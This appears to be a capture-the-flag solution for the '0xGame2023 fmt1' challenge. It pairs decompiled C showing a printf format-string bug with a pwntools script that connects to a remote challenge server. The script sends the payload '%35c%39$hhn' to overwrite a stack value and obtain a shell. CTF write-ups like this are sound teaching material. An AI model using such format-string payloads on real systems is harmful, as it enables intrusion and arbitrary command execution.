"""0xGame2023 fmt1
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[256]; // [rsp+0h] [rbp-110h] BYREF
  int v5; // [rsp+100h] [rbp-10h] BYREF
  int v6; // [rsp+104h] [rbp-Ch]
  int *v7; // [rsp+108h] [rbp-8h] // 目标地址直接在栈上

  bufinit(argc, argv, envp);
  v7 = &v5;
  v6 = 0x2023;
  v5 = 0x20FF;
  read(0, buf, 0x100uLL);
  printf(buf);
  if ( v6 == v5 )
  {
    system("/bin/sh");
  }
}
"""from pwn import *

# s = process('./fmt1')
s = remote('8.130.35.16',52000)
payload = b'%35c%39$hhn'  # 35 = 0x23 栈上直接找到偏移为 39。
s.send(payload)
s.interactive()
